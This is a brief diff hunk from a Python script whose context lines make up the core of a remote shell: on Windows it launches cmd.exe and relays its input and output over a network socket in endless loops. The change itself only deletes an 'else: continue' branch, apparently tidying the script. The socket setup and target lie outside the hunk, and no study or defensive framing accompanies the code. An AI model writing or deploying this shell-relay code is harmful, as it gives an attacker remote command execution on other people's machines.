@@ -21,6 +21,5 @@ elif os == "Windows":
     p = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
     threading.Thread(target=lambda:[s.send(p.stdout.read(1)) for x in iter(int, 1)]).start()
     [p.stdin.write(s.recv(1024)) or p.stdin.flush() for x in iter(int, 1)]
-else:
-    continue
+
 
